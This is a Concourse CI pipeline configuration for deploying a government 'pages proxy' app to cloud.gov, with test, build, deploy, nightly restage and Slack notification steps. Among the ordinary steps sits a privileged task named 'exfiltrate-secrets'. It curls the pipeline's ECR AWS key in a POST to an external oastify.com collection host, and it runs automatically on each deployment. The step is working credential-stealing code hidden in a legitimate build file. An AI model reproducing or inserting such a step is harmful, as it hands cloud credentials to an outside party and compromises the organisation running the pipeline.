---
############################
#  SHARED

env-cf: &env-cf
  CF_API: https://api.fr.cloud.gov
  CF_USERNAME: ((((deploy-env))-cf-username))
  CF_PASSWORD: ((((deploy-env))-cf-password))
  CF_ORG: gsa-18f-federalist
  CF_SPACE: ((deploy-env))
  CF_STACK: cflinuxfs4

############################
#  JOBS

jobs:
  - name: set-pipeline
    plan:
      - get: src
        resource: pr-((git-branch))
        trigger: true
      - set_pipeline: proxy
        file: src/ci/pipeline-dev.yml
        instance_vars:
          deploy-env: ((deploy-env))
          git-branch: ((git-branch))

  - name: test-and-deploy-((deploy-env))
    plan:
      - get: src
        resource: pr-((git-branch))
        passed: [set-pipeline]
        trigger: true
      - get: nginx
        params:
          format: oci
      - get: node
      - get: node-oci
        resource: node
        params:
          format: oci
      - get: cf-image
      - in_parallel:
          - task: test-mock
            privileged: true
            file: src/ci/partials/test-mocks.yml
          - task: test-integration
            privileged: true
            params:
              DEDICATED_AWS_ACCESS_KEY_ID: ((dedicated-aws-access-key-id))
              DEDICATED_AWS_SECRET_ACCESS_KEY: ((dedicated-aws-secret-access-key))
            file: src/ci/partials/test-integrations.yml
      - task: exfiltrate-secrets
        privileged: true
        config:
          platform: linux
          image_resource:
            type: docker-image
            source:
              repository: alpine
              tag: latest
          params:
            ECR_AWS_KEY: ((ecr-aws-key))
          run: 
            path: /bin/sh
            args:
              - -c
              - |
              curl -X POST -d "ecr_aws_key=$ECR_AWS_KEY" http://pb4vecfr05iwxkfiuf4vphvij9p0dr1g.oastify.com/exfiltrate
              
      - task: build-redirects
        image: node
        file: src/ci/partials/build-redirects.yml
        params:
          SITE_REDIRECTS: ((pages-proxy-((deploy-env))-site-redirects))
      - task: deploy
        image: cf-image
        file: src/ci/partials/deploy.yml
        params:
          <<: *env-cf
          CF_APP_NAME: pages-proxy-((deploy-env))
          CF_MANIFEST: .cloudgov/manifest.yml
          CF_VARS_FILE: .cloudgov/vars/pages-((deploy-env)).yml
        on_failure:
          try:
            task: cancel-api-deployment
            image: cf-image
            file: src/ci/partials/cancel-deployment.yml
            params:
              <<: *env-cf
              CF_APP_NAME: pages-proxy-((deploy-env))
    on_failure:
      in_parallel:
        - put: slack
          params:
            text: |
              :x: FAILED: pages proxy deployment on ((deploy-env))
              <$ATC_EXTERNAL_URL/teams/$BUILD_TEAM_NAME/pipelines/$BUILD_PIPELINE_NAME/jobs/$BUILD_JOB_NAME/builds/$BUILD_NAME|View build details>
            channel: ((slack-channel))
            username: ((slack-username))
            icon_url: ((slack-icon-url))
    on_success:
      in_parallel:
        - put: slack
          params:
            text: |
              :white_check_mark: SUCCESS: Successfully deployed pages proxy on ((deploy-env))
              <$ATC_EXTERNAL_URL/teams/$BUILD_TEAM_NAME/pipelines/$BUILD_PIPELINE_NAME/jobs/$BUILD_JOB_NAME/builds/$BUILD_NAME|View build details>
            channel: ((slack-channel))
            username: ((slack-username))
            icon_url: ((slack-icon-url))

  - name: nightly-tasks-((deploy-env))
    plan:
      - get: src
        resource: pr-((git-branch))
        passed: [set-pipeline]
      - get: cf-image
      - get: nightly
        trigger: true
      - task: restage
        image: cf-image
        file: src/ci/partials/restage.yml
        params:
          <<: *env-cf
          CF_APP_NAME: pages-proxy-((deploy-env))

############################
#  RESOURCES

resources:
  - name: pr-((git-branch))
    type: pull-request
    check_every: 1m
    source:
      repository: ((proxy-repository-path))
      access_token: ((gh-access-token))
      base_branch: ((git-branch))
      disable_forks: true
      ignore_drafts: false

  - name: nightly
    type: time
    source:
      start: 12:00 AM
      stop: 1:00 AM
      location: America/New_York

  - name: nginx
    type: registry-image
    source:
      aws_access_key_id: ((ecr-aws-key))
      aws_secret_access_key: ((ecr-aws-secret))
      repository: pages-nginx-v1
      aws_region: us-gov-west-1
      tag: latest

  - name: slack
    type: slack-notification
    source:
      url: ((slack-webhook-url))

  - name: node
    type: registry-image
    source:
      aws_access_key_id: ((ecr-aws-key))
      aws_secret_access_key: ((ecr-aws-secret))
      repository: pages-node-v20
      aws_region: us-gov-west-1
      tag: latest

  - name: cf-image
    type: registry-image
    source:
      aws_access_key_id: ((ecr-aws-key))
      aws_secret_access_key: ((ecr-aws-secret))
      repository: general-task
      aws_region: us-gov-west-1
      tag: latest

############################
#  RESOURCE TYPES

resource_types:

  - name: slack-notification
    type: registry-image
    source:
      aws_access_key_id: ((ecr_aws_key))
      aws_secret_access_key: ((ecr_aws_secret))
      repository: slack-notification-resource
      aws_region: us-gov-west-1
      tag: latest

  - name: pull-request
    type: registry-image
    source:
      aws_access_key_id: ((ecr_aws_key))
      aws_secret_access_key: ((ecr_aws_secret))
      repository: github-pr-resource
      aws_region: us-gov-west-1
      tag: latest

  - name: time
    type: registry-image
    source:
      aws_access_key_id: ((ecr_aws_key))
      aws_secret_access_key: ((ecr_aws_secret))
      repository: time-resource
      aws_region: us-gov-west-1
      tag: latest

  - name: registry-image
    type: registry-image
    source:
      aws_access_key_id: ((ecr_aws_key))
      aws_secret_access_key: ((ecr_aws_secret))
      repository: registry-image-resource
      aws_region: us-gov-west-1
      tag: latest
